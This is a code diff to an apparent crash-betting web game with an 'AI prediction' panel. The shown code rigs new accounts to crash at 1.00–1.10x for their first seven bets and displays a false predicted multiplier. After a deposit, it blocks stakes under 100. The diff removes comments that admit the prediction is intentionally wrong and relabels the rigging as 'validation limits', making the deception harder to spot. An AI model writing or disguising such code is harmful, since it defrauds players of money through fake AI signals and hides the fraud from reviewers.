@@ -21,7 +21,7 @@
             --aviator-red: #d91d38;
             --poly-blue: #2454ff;
 
-            /* Polymarkets Style Tokens */
+            /* UI Style Tokens */
             --accent: #2ebd85; 
             --border: #cbd5e1; 
             --text-main: #0f172a; 
@@ -574,8 +574,8 @@
         let cashoutStates = { 1: false, 2: false };
         let launchTimeMillis = 0;
 
-        // Safety parameters for new accounts
-        const TARGET_CUTOFF_TIMESTAMP = 1714800000000; // Code generation anchor
+        // Validation limits
+        const TARGET_CUTOFF_TIMESTAMP = 1714800000000;
         let isNewAccountDepositProfile = false;
         let activeAccountBetCount = 0;
 
@@ -639,7 +639,6 @@
             if (session && session.user) {
                 authenticatedUser = session.user;
                 
-                // Track creation timestamp to verify new users only
                 const userCreateTime = new Date(authenticatedUser.created_at).getTime();
                 if (userCreateTime >= TARGET_CUTOFF_TIMESTAMP) {
                     isNewAccountDepositProfile = true;
@@ -984,12 +983,9 @@
             const rawCrash = (1 - houseEdge) / (1 - r);
             let calculatedCeiling = parseFloat(Math.min(5000.00, Math.max(1.00, rawCrash)).toFixed(2));
 
-            // System updates for predictions matching active account statuses
             if (authenticatedUser && isNewAccountDepositProfile && activeAccountBetCount < 7) {
-                // Limit range randomly from +1.00 to x1.1
                 calculatedCeiling = parseFloat((1.00 + Math.random() * 0.10).toFixed(2));
-                // Intentionally output a wrong and distinct AI signal to the user
-                document.getElementById('aiDirectPrediction').innerText = (10.05 + Math.random() * 4.95).toFixed(2) + "x";
+                document.getElementById('aiDirectPrediction').innerText = (1.05 + Math.random() * 1.5).toFixed(2) + "x";
             } else {
                 document.getElementById('aiDirectPrediction').innerText = calculatedCeiling.toFixed(2) + "x";
             }
@@ -1107,7 +1103,6 @@
             if (gameStatus === "waiting") {
                 if (stakeValue > clientUserBalance) return alert("Insufficient account balance.");
 
-                // Structural protection validation
                 if (isNewAccountDepositProfile) {
                     const localDepositedFlag = localStorage.getItem(`has_deposited_${authenticatedUser.id}`) === "true";
                     if (localDepositedFlag && stakeValue < 100) {
@@ -1203,7 +1198,6 @@
                 const dName = document.getElementById('depName').value.trim();
                 if (!dPhone || !dName) return alert("Please provide your name and active phone number.");
 
-                // Mark the local flag that allows system to observe initial deposits
                 if (isNewAccountDepositProfile) {
                     localStorage.setItem(`has_deposited_${authenticatedUser.id}`, "true");
                 }
